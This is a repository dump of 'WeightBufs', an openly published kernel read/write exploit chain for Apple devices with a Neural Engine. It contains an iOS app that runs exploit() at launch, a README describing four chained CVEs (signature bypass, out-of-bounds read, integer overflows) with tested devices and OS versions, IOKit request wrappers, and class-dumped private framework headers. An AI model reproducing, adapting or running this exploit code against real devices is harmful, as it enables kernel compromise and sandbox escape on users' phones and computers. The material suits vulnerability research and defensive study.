Project Path: arc_0x36_weightBufs_uw4t1faq

Source Tree:

```txt
arc_0x36_weightBufs_uw4t1faq
├── AppDelegate.h
├── AppDelegate.m
├── Assets.xcassets
│   ├── AccentColor.colorset
│   │   └── Contents.json
│   ├── AppIcon.appiconset
│   │   └── Contents.json
│   └── Contents.json
├── Base.lproj
│   ├── LaunchScreen.storyboard
│   └── Main.storyboard
├── Info.plist
├── LICENSE
├── README.md
├── SceneDelegate.h
├── SceneDelegate.m
├── ViewController.h
├── ViewController.m
├── attacking_ane_poc2022.pdf
├── exploit
│   ├── ANEDirectIn.c
│   ├── ANEDirectIn.h
│   ├── AppleNeuralEngine
│   │   ├── AppleNeuralEngine-Structs.h
│   │   ├── AppleNeuralEngine.h
│   │   ├── NSCopying.h
│   │   ├── NSSecureCoding.h
│   │   ├── _ANEClient.h
│   │   ├── _ANECloneHelper.h
│   │   ├── _ANEDaemonConnection.h
│   │   ├── _ANEDaemonProtocol.h
│   │   ├── _ANEDataReporter.h
│   │   ├── _ANEDeviceController.h
│   │   ├── _ANEDeviceInfo.h
│   │   ├── _ANEErrors.h
│   │   ├── _ANEHashEncoding.h
│   │   ├── _ANEIOSurfaceObject.h
│   │   ├── _ANELog.h
│   │   ├── _ANEModel.h
│   │   ├── _ANEPerformanceStats.h
│   │   ├── _ANEProgramForEvaluation.h
│   │   ├── _ANEQoSMapper.h
│   │   ├── _ANERequest.h
│   │   └── _ANEStrings.h
│   ├── IOGPU.c
│   ├── IOGPU.h
│   ├── IOSurface.c
│   ├── IOSurface.h
│   ├── aneProgram.h
│   ├── build_macos.sh
│   ├── exploit.h
│   ├── exploit.m
│   ├── iokit.h
│   ├── model_tmp.hwx
│   └── utils.c
├── main.m
└── mymodel.mlmodel

```

`AppDelegate.h`:

```h
//
//  AppDelegate.h
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import <UIKit/UIKit.h>

@interface AppDelegate : UIResponder <UIApplicationDelegate>


@end


```

`AppDelegate.m`:

```m
//
//  AppDelegate.m
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import "AppDelegate.h"
#include "exploit/exploit.h"
@interface AppDelegate ()

@end

@implementation AppDelegate


- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Override point for customization after application launch.
    exploit();
    return YES;
}


#pragma mark - UISceneSession lifecycle


- (UISceneConfiguration *)application:(UIApplication *)application configurationForConnectingSceneSession:(UISceneSession *)connectingSceneSession options:(UISceneConnectionOptions *)options {
    // Called when a new scene session is being created.
    // Use this method to select a configuration to create the new scene with.
    return [[UISceneConfiguration alloc] initWithName:@"Default Configuration" sessionRole:connectingSceneSession.role];
}


- (void)application:(UIApplication *)application didDiscardSceneSessions:(NSSet<UISceneSession *> *)sceneSessions {
    // Called when the user discards a scene session.
    // If any sessions were discarded while the app0xffffffed2ffc8000lication was not running, this will be called shortly after application:didFinishLaunchingWithOptions.
    // Use this method to release any resources that were specific to the discarded scenes, as they will not return.
}


@end

```

`Assets.xcassets/AccentColor.colorset/Contents.json`:

```json
{
  "colors" : [
    {
      "idiom" : "universal"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Assets.xcassets/AppIcon.appiconset/Contents.json`:

```json
{
  "images" : [
    {
      "idiom" : "iphone",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "idiom" : "iphone",
      "scale" : "3x",
      "size" : "20x20"
    },
    {
      "idiom" : "iphone",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "idiom" : "iphone",
      "scale" : "3x",
      "size" : "29x29"
    },
    {
      "idiom" : "iphone",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "idiom" : "iphone",
      "scale" : "3x",
      "size" : "40x40"
    },
    {
      "idiom" : "iphone",
      "scale" : "2x",
      "size" : "60x60"
    },
    {
      "idiom" : "iphone",
      "scale" : "3x",
      "size" : "60x60"
    },
    {
      "idiom" : "ipad",
      "scale" : "1x",
      "size" : "20x20"
    },
    {
      "idiom" : "ipad",
      "scale" : "2x",
      "size" : "20x20"
    },
    {
      "idiom" : "ipad",
      "scale" : "1x",
      "size" : "29x29"
    },
    {
      "idiom" : "ipad",
      "scale" : "2x",
      "size" : "29x29"
    },
    {
      "idiom" : "ipad",
      "scale" : "1x",
      "size" : "40x40"
    },
    {
      "idiom" : "ipad",
      "scale" : "2x",
      "size" : "40x40"
    },
    {
      "idiom" : "ipad",
      "scale" : "1x",
      "size" : "76x76"
    },
    {
      "idiom" : "ipad",
      "scale" : "2x",
      "size" : "76x76"
    },
    {
      "idiom" : "ipad",
      "scale" : "2x",
      "size" : "83.5x83.5"
    },
    {
      "idiom" : "ios-marketing",
      "scale" : "1x",
      "size" : "1024x1024"
    }
  ],
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Assets.xcassets/Contents.json`:

```json
{
  "info" : {
    "author" : "xcode",
    "version" : 1
  }
}

```

`Base.lproj/LaunchScreen.storyboard`:

```storyboard
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="13122.16" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" launchScreen="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="01J-lp-oVM">
    <dependencies>
        <plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="13104.12"/>
        <capability name="Safe area layout guides" minToolsVersion="9.0"/>
        <capability name="documents saved in the Xcode 8 format" minToolsVersion="8.0"/>
    </dependencies>
    <scenes>
        <!--View Controller-->
        <scene sceneID="EHf-IW-A2E">
            <objects>
                <viewController id="01J-lp-oVM" sceneMemberID="viewController">
                    <view key="view" contentMode="scaleToFill" id="Ze5-6b-2t3">
                        <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
                        <autoresizingMask key="autoresizingMask" widthSizable="YES" heightSizable="YES"/>
                        <color key="backgroundColor" xcode11CocoaTouchSystemColor="systemBackgroundColor" cocoaTouchSystemColor="whiteColor"/>
                        <viewLayoutGuide key="safeArea" id="6Tk-OE-BBY"/>
                    </view>
                </viewController>
                <placeholder placeholderIdentifier="IBFirstResponder" id="iYj-Kq-Ea1" userLabel="First Responder" sceneMemberID="firstResponder"/>
            </objects>
            <point key="canvasLocation" x="53" y="375"/>
        </scene>
    </scenes>
</document>

```

`Base.lproj/Main.storyboard`:

```storyboard
<?xml version="1.0" encoding="UTF-8"?>
<document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="13122.16" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="BYZ-38-t0r">
    <dependencies>
        <plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="13104.12"/>
        <capability name="Safe area layout guides" minToolsVersion="9.0"/>
        <capability name="documents saved in the Xcode 8 format" minToolsVersion="8.0"/>
    </dependencies>
    <scenes>
        <!--View Controller-->
        <scene sceneID="tne-QT-ifu">
            <objects>
                <viewController id="BYZ-38-t0r" customClass="ViewController" customModuleProvider="" sceneMemberID="viewController">
                    <view key="view" contentMode="scaleToFill" id="8bC-Xf-vdC">
                        <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
                        <autoresizingMask key="autoresizingMask" widthSizable="YES" heightSizable="YES"/>
                        <color key="backgroundColor" xcode11CocoaTouchSystemColor="systemBackgroundColor" cocoaTouchSystemColor="whiteColor"/>
                        <viewLayoutGuide key="safeArea" id="6Tk-OE-BBY"/>
                    </view>
                </viewController>
                <placeholder placeholderIdentifier="IBFirstResponder" id="dkx-z0-nzr" sceneMemberID="firstResponder"/>
            </objects>
        </scene>
    </scenes>
</document>

```

`Info.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>UIApplicationSceneManifest</key>
	<dict>
		<key>UIApplicationSupportsMultipleScenes</key>
		<false/>
		<key>UISceneConfigurations</key>
		<dict>
			<key>UIWindowSceneSessionRoleApplication</key>
			<array>
				<dict>
					<key>UISceneConfigurationName</key>
					<string>Default Configuration</string>
					<key>UISceneDelegateClassName</key>
					<string>SceneDelegate</string>
					<key>UISceneStoryboardFile</key>
					<string>Main</string>
				</dict>
			</array>
		</dict>
	</dict>
</dict>
</plist>

```

`LICENSE`:

```
MIT License

Copyright (c) 2022 Mohamed Ghannam

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

`README.md`:

```md
# WeightBufs:

`WeightBufs` is a kernel r/w exploit for all Apple devices with Neural Engine support.
Bugs and Exploit by [@_simo36_](https://twitter.com/_simo36), you can read my [presentation slides at POC](https://github.com/0x36/weightBufs/blob/main/attacking_ane_poc2022.pdf) for more details about the vulnerabilities and the exploitation techniques.

The exploit doesn't rely on any hardcoded address or offset, and it should work AS IS on macOS12 up to 12.4 and *OS 15 up to 15.5. 

The kernel vulerabilties affect all iOS 15 versions (up to 16.0), however the sandbox escape has been fixed on iOS 15.6. As a result, breaking the exploit chain and another sandbox escape is required to get things working again on iOS 15.6/15.7.
Although I have another sandbox escape that works up to iOS 16.1, I'm not sure if the kernel exploit techniques are still usable on iOS 15.6+.


# Vulnerabilities:

The exploit chains 4 vulnerabilities which I independently discovered and reported to Apple:
 * `CVE-2022-32845` : aned signature check bypass for model.hwx.
 * `CVE-2022-32948` : DeCxt::FileIndexToWeight() OOB Read due to lack of array index validation.
 * `CVE-2022-42805` : ZinComputeProgramUpdateMutables() potential arbitrary read due to Integer overflow issue.
 * `CVE-2022-32899` : DeCxt::RasterizeScaleBiasData() Buffer underflow due to integer overflow issue.

# Tested devices:

 * iPhone12 Pro (iPhone13,3) with iOS 15.5.
 * iPad Pro (iPad8,10) with iPadOS 15.5.
 * iPhone11 Pro (iPhone12,3) with iOS 15.4.1.
 * MacBookAir10,1 M1 with macOS 12.4.


# Notes:

There are some situations where the exploit may fail:
- The target *IOSurface* or *IOSurfaceClient* object address is upper to the mutable kernel buffer `MUTK`,however the exploit detects the failure early, preventing the device from crashing. It's sufficient to run the exploit again and it should succeed on the second attempt.
- If the exploit frequently crashes the device at stage 2 or stage 3, that means it must be tuned to the tested device, make sure to read `DEBUG_EXPLOIT_STAGE_2_KERN_PANIC` and `DEBUG_EXPLOIT_STAGE_3_KERN_PANIC` for more details.
- The target device needs to be in an idle state, and it's preferable to reboot it before using the exploit, even better if the airplane mode is turned on.


# Credit
WeightBufs includes AppleNeuralEngine framework header files generated by Elias Limneos via classdump-dyld 1.0.


# License
WeightBufs is released under the MIT license.

```

`SceneDelegate.h`:

```h
//
//  SceneDelegate.h
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import <UIKit/UIKit.h>

@interface SceneDelegate : UIResponder <UIWindowSceneDelegate>

@property (strong, nonatomic) UIWindow * window;

@end


```

`SceneDelegate.m`:

```m
//
//  SceneDelegate.m
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import "SceneDelegate.h"

@interface SceneDelegate ()

@end

@implementation SceneDelegate


- (void)scene:(UIScene *)scene willConnectToSession:(UISceneSession *)session options:(UISceneConnectionOptions *)connectionOptions {
    // Use this method to optionally configure and attach the UIWindow `window` to the provided UIWindowScene `scene`.
    // If using a storyboard, the `window` property will automatically be initialized and attached to the scene.
    // This delegate does not imply the connecting scene or session are new (see `application:configurationForConnectingSceneSession` instead).
}


- (void)sceneDidDisconnect:(UIScene *)scene {
    // Called as the scene is being released by the system.
    // This occurs shortly after the scene enters the background, or when its session is discarded.
    // Release any resources associated with this scene that can be re-created the next time the scene connects.
    // The scene may re-connect later, as its session was not necessarily discarded (see `application:didDiscardSceneSessions` instead).
}


- (void)sceneDidBecomeActive:(UIScene *)scene {
    // Called when the scene has moved from an inactive state to an active state.
    // Use this method to restart any tasks that were paused (or not yet started) when the scene was inactive.
}


- (void)sceneWillResignActive:(UIScene *)scene {
    // Called when the scene will move from an active state to an inactive state.
    // This may occur due to temporary interruptions (ex. an incoming phone call).
}


- (void)sceneWillEnterForeground:(UIScene *)scene {
    // Called as the scene transitions from the background to the foreground.
    // Use this method to undo the changes made on entering the background.
}


- (void)sceneDidEnterBackground:(UIScene *)scene {
    // Called as the scene transitions from the foreground to the background.
    // Use this method to save data, release shared resources, and store enough scene-specific state information
    // to restore the scene back to its current state.
}


@end

```

`ViewController.h`:

```h
//
//  ViewController.h
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import <UIKit/UIKit.h>

@interface ViewController : UIViewController


@end


```

`ViewController.m`:

```m
//
//  ViewController.m
//  weightBufs
//
//  Created by simo on 06/06/2022.
//

#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
}


@end

```

`exploit/ANEDirectIn.c`:

```c
#include "ANEDirectIn.h"

kern_return_t do__ANEDirect_ProgramSendRequest(io_connect_t client,mach_port_t port, void *address)
{

        uint32_t structInputCnt = 16;
        uint32_t structOutputCnt = 0;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint64_t * input = (uint64_t *)args->sInput;
        input[0] = (uint64_t)address;
        input[1] = 0xA60;

        args->client = client;
        args->asyncAwake = port;
        kern_return_t kr = IOConnectCallAsyncMethod(args->client,
                                                    2,
                                                    args->asyncAwake,
                                                    args->references,
                                                    8,
                                                    args->scalarI,args->scalarISize,
                                                    args->sInput, args->sInputSize,
                                                    args->scalarO, (uint32_t *)&args->scalarOSize,
                                                    args->sOutput, (size_t *)&args->sOutputSize);
        /* printf("_ANE_ProgramSendRequest status -> kr = (0x%x) %s\n",kr, mach_error_string(kr)); */
        destroy_args(args);
        return kr;
}

kern_return_t do__ANEDriect_DeviceOpen(io_connect_t client,void *in)
{

        uint32_t structInputCnt = 88;
        uint32_t structOutputCnt = 88;

        IOKit_args_t *args = allocate_args(structInputCnt,structOutputCnt, False);

        uint8_t * input = (uint8_t *)args->sInput;
        args->sInput = (uint8_t *)in;

        args->client = client;

        kern_return_t kr = IOConnectCallMethod(args->client,
                                               0,
                                               args->scalarI,args->scalarISize,
                                               args->sInput, args->sInputSize,
                                               args->scalarO, (uint32_t *)&args->scalarOSize,
                                               args->sOutput, (size_t *)&args->sOutputSize);
        if(kr)
                printf("_ANEDirect_DeviceOpen status -> kr = (0x%x) %s\n",kr, mach_error_string(kr));
        args->sInput = input;
        memcpy(in,args->sOutput,structInputCnt);
        destroy_args(args);
        return kr;
}

```

`exploit/ANEDirectIn.h`:

```h
#ifndef _H_ANEDIRECTIN_H
#define _H_ANEDIRECTIN_H

#include "iokit.h"

struct H11ANEDeviceInfoStruct {
        uint64_t fields[0x58/8];
};

typedef struct
{
        uint64_t programHandle;
        uint64_t field_8;
        unsigned int procedureId;
        uint32_t field_14;
        uint64_t field_18;
        uint64_t field_20;
        unsigned int total_InputBuffers;
        char inputBufferSymbolIndex[256];
        uint32_t inputBufferSurfaceId[255];
        unsigned int total_OutputBuffers;
        char OutputBuffers[256];
        uint32_t outputBufferSurfaceId[255];
        unsigned int total_IntermediateBuffers;
        uint IntermediateBufferSurfaceId[3];
        uint64_t callBack;
        uint64_t refCon;
        char field_A48;
        char field_A49;
        char field_A4A;
        char field_A4B;
        uint32_t weightsBufferSurfaceId;
        uint64_t EventsAddr;
        uint64_t field_A58;
} H11ANEProgramRequestArgsStruct;

kern_return_t do__ANEDriect_DeviceOpen(io_connect_t client,void *in);
kern_return_t do__ANEDirect_ProgramSendRequest(io_connect_t client,mach_port_t port, void *address);

#endif  /* _H_ANEDIRECTIN_H */

```

`exploit/AppleNeuralEngine/AppleNeuralEngine-Structs.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

typedef struct _NSZone* NSZoneRef;

typedef struct os_unfair_lock_s {
	unsigned _os_unfair_lock_opaque;
} os_unfair_lock_s;

typedef struct __IOSurface* IOSurfaceRef;

typedef struct {

} SCD_Struct_AN3;


```

`exploit/AppleNeuralEngine/AppleNeuralEngine.h`:

```h
#import <AppleNeuralEngine/_ANEDeviceInfo.h>
#import <AppleNeuralEngine/_ANEDataReporter.h>
#import <AppleNeuralEngine/_ANEProgramForEvaluation.h>
#import <AppleNeuralEngine/_ANEModel.h>
#import <AppleNeuralEngine/_ANEHashEncoding.h>
#import <AppleNeuralEngine/_ANERequest.h>
#import <AppleNeuralEngine/_ANELog.h>
#import <AppleNeuralEngine/_ANEQoSMapper.h>
#import <AppleNeuralEngine/_ANEStrings.h>
#import <AppleNeuralEngine/_ANEDaemonConnection.h>
#import <AppleNeuralEngine/_ANEPerformanceStats.h>
#import <AppleNeuralEngine/_ANEIOSurfaceObject.h>
#import <AppleNeuralEngine/_ANEDeviceController.h>
#import <AppleNeuralEngine/_ANEClient.h>
#import <AppleNeuralEngine/_ANEErrors.h>
#import <AppleNeuralEngine/_ANECloneHelper.h>

```

`exploit/AppleNeuralEngine/NSCopying.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol NSCopying
@required
-(id)copyWithZone:(NSZone*)arg1;

@end


```

`exploit/AppleNeuralEngine/NSSecureCoding.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol NSSecureCoding <NSCoding>
@required
+(BOOL)supportsSecureCoding;

@end


```

`exploit/AppleNeuralEngine/_ANEClient.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@class _ANEDaemonConnection, NSArray;

@interface _ANEClient : NSObject {

	_ANEDaemonConnection* _conn;
	NSArray* _queues;

}

@property (nonatomic,readonly) _ANEDaemonConnection * conn;              //@synthesize conn=_conn - In the implementation block
@property (nonatomic,readonly) NSArray * queues;                         //@synthesize queues=_queues - In the implementation block
+(void)initialize;
+(id)sharedPrivateConnection;
+(id)sharedConnection;
+(id)sandboxExtensionForModel:(id)arg1 ;
-(BOOL)echo:(id)arg1 ;
-(_ANEDaemonConnection *)conn;
-(NSArray *)queues;
-(void)dealloc;
-(BOOL)compiledModelExistsFor:(id)arg1 ;
-(void)purgeCompiledModel:(id)arg1 ;
-(BOOL)loadRealTimeModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)loadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)unloadRealTimeModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)unloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)evaluateRealTimeWithModel:(id)arg1 options:(id)arg2 request:(id)arg3 error:(id*)arg4 ;
-(BOOL)evaluateWithModel:(id)arg1 options:(id)arg2 request:(id)arg3 qos:(unsigned)arg4 error:(id*)arg5 ;
-(BOOL)compileModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(id)initWithRestrictedAccessAllowed:(BOOL)arg1 ;
-(BOOL)doLoadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)doEvaluateDirectWithModel:(id)arg1 options:(id)arg2 request:(id)arg3 qos:(unsigned)arg4 error:(id*)arg5 ;
-(BOOL)doUnloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 error:(id*)arg4 ;
-(BOOL)beginRealTimeTask;
-(BOOL)endRealTimeTask;
@end


```

`exploit/AppleNeuralEngine/_ANECloneHelper.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANECloneHelper : NSObject
+(BOOL)shouldSkipCloneFor:(id)arg1 isEncryptedModel:(BOOL)arg2 ;
+(id)cloneIfWritable:(id)arg1 isEncryptedModel:(BOOL)arg2 cloneDirectory:(id)arg3 ;
@end


```

`exploit/AppleNeuralEngine/_ANEDaemonConnection.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <libobjc.A.dylib/_ANEDaemonProtocol.h>

@class NSXPCConnection;

@interface _ANEDaemonConnection : NSObject <_ANEDaemonProtocol> {

	BOOL _restricted;
	NSXPCConnection* _daemonConnection;

}

@property (nonatomic,readonly) NSXPCConnection * daemonConnection;              //@synthesize daemonConnection=_daemonConnection - In the implementation block
@property (nonatomic,readonly) BOOL restricted;                                 //@synthesize restricted=_restricted - In the implementation block
+(id)daemonConnection;
+(id)daemonConnectionRestricted;
-(void)dealloc;
-(BOOL)restricted;
-(id)init;
-(NSXPCConnection *)daemonConnection;
-(id)initWithMachServiceName:(id)arg1 restricted:(BOOL)arg2 ;
-(void)beginRealTimeTaskWithReply:(/*^block*/id)arg1 ;
-(void)endRealTimeTaskWithReply:(/*^block*/id)arg1 ;
-(void)echo:(id)arg1 withReply:(/*^block*/id)arg2 ;
-(void)compileModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5 ;
-(void)loadModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5 ;
-(void)unloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 withReply:(/*^block*/id)arg4 ;
-(void)compiledModelExistsFor:(id)arg1 withReply:(/*^block*/id)arg2 ;
-(void)purgeCompiledModel:(id)arg1 withReply:(/*^block*/id)arg2 ;
@end


```

`exploit/AppleNeuralEngine/_ANEDaemonProtocol.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol _ANEDaemonProtocol
@required
-(void)compileModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5;
-(void)loadModel:(id)arg1 sandboxExtension:(id)arg2 options:(id)arg3 qos:(unsigned)arg4 withReply:(/*^block*/id)arg5;
-(void)unloadModel:(id)arg1 options:(id)arg2 qos:(unsigned)arg3 withReply:(/*^block*/id)arg4;
-(void)compiledModelExistsFor:(id)arg1 withReply:(/*^block*/id)arg2;
-(void)purgeCompiledModel:(id)arg1 withReply:(/*^block*/id)arg2;

@end


```

`exploit/AppleNeuralEngine/_ANEDataReporter.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEDataReporter : NSObject
+(void)addValue:(long long)arg1 forScalarKey:(id)arg2 ;
+(void)setValue:(long long)arg1 forScalarKey:(id)arg2 ;
+(void)clearScalarKey:(id)arg1 ;
+(id)aggdKey:(id)arg1 ;
+(id)reportClient:(id)arg1 modelName:(id)arg2 ;
@end


```

`exploit/AppleNeuralEngine/_ANEDeviceController.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@protocol OS_dispatch_queue;
#import <AppleNeuralEngine/AppleNeuralEngine-Structs.h>
@class NSObject;

@interface _ANEDeviceController : NSObject {

	BOOL _isPrivileged;
	NSObject*<OS_dispatch_queue> _q;
	long long _usecount;
	unsigned long long _programHandle;
	SCD_Struct_AN3* _device;

}

@property (q,nonatomic,readonly) NSObject*<OS_dispatch_queue> q;              //@synthesize q=_q - In the implementation block
@property (assign,nonatomic) long long usecount;                              //@synthesize usecount=_usecount - In the implementation block
@property (nonatomic,readonly) BOOL isPrivileged;                             //@synthesize isPrivileged=_isPrivileged - In the implementation block
@property (assign,nonatomic) unsigned long long programHandle;                //@synthesize programHandle=_programHandle - In the implementation block
@property (assign,nonatomic) SCD_Struct_AN3* device;                          //@synthesize device=_device - In the implementation block
+(id)controllerWithProgramHandle:(unsigned long long)arg1 ;
+(id)sharedPrivilegedConnection;
-(NSObject*<OS_dispatch_queue>)q;
-(SCD_Struct_AN3*)device;
-(void)start;
-(void)setDevice:(SCD_Struct_AN3*)arg1 ;
-(void)stop;
-(BOOL)isPrivileged;
-(unsigned long long)programHandle;
-(void)setProgramHandle:(unsigned long long)arg1 ;
-(id)initWithProgramHandle:(unsigned long long)arg1 priviledged:(BOOL)arg2 ;
-(long long)usecount;
-(void)setUsecount:(long long)arg1 ;
@end


```

`exploit/AppleNeuralEngine/_ANEDeviceInfo.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEDeviceInfo : NSObject
+(BOOL)isInternalBuild;
+(BOOL)hasANE;
+(id)bootArgs;
+(id)buildVersion;
+(id)aneSubType;
+(BOOL)precompiledModelChecksDisabled;
@end


```

`exploit/AppleNeuralEngine/_ANEErrors.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEErrors : NSObject
+(id)createErrorWithCode:(long long)arg1 description:(id)arg2 ;
+(id)programInferenceOverflowErrorForMethod:(id)arg1 ;
+(id)programInferenceOtherErrorForMethod:(id)arg1 ;
+(id)entitlementErrorForMethod:(id)arg1 ;
+(id)priorityErrorForMethod:(id)arg1 ;
+(id)timeoutErrorForMethod:(id)arg1 ;
+(id)programCreationErrorForMethod:(id)arg1 ;
+(id)programLoadErrorForMethod:(id)arg1 ;
+(id)missingCodeSigningErrorForMethod:(id)arg1 ;
@end


```

`exploit/AppleNeuralEngine/_ANEHashEncoding.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Thursday, September 24, 2020 at 12:37:44 AM British Summer Time
* Operating System: Version 14.0 (Build 18A373)
* Image Source: /System/Library/PrivateFrameworks/AppleNeuralEngine.framework/AppleNeuralEngine
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/


@interface _ANEHashEncoding : NSObject
+(id)hexStringFor:(id)arg1 ;
+(void)copySHA256For:(id)arg1 toBuffer:(char*)arg2 ;
+(unsigned)hashFor:(id)arg1 seed:(unsigned)arg2 ;
@end


```

